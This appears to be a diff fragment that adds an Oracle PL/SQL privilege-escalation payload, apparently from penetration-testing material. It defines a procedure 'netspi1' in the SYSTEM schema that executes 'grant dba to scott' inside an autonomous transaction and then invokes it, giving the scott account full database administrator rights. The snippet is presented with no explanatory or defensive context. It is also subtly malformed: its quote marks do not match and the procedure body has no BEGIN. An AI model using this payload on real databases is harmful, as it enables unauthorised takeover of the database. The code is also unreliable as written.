@@ -1,0 +1,10 @@
+CREATE OR REPLACE PROCEDURE “SYSTEM".netspi1 (id IN VARCHAR2)
+AS
+PRAGMA autonomous_transaction;
+EXECUTE IMMEDIATE 'grant dba to scott';
+COMMIT;
+END;
+
+BEGIN
+SYSTEM.netspi1('netspi');
+END;
